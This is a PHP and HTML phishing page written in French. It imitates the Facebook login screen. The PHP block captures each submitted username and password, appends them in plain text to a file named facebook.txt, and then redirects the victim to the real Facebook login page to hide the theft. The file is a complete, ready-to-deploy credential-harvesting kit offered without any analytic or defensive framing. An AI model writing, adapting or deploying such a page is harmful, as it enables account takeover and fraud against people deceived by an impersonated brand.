<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Enregistrer les informations dans un fichier texte
    $file = @fopen("facebook.txt", "a");
    if ($file) {
        fwrite($file, "Username: $username, Password: $password\n");
        fclose($file);

        // Rediriger l'utilisateur vers la vraie page de connexion
        header("Location: https://facebook.com/login");
        //echo "C'était une Réussite Totale";
	exit();
    } 
}

?>





<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion Facebook</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <h1>Facebook</h1>
        <form action="" method="post">
            <input type="text" name="username" placeholder="Adresse e-mail ou mobile" required>
            <input type="password" name="password" placeholder="Mot de passe" required>
            <button type="submit">Se connecter</button>
        </form>
        <div class="footer">
            <a href="#">Mot de passe oublié ?</a>
            <hr>
            <button class="create-account">Créer un nouveau compte</button>
        </div>
    </div>
</body>
</html>
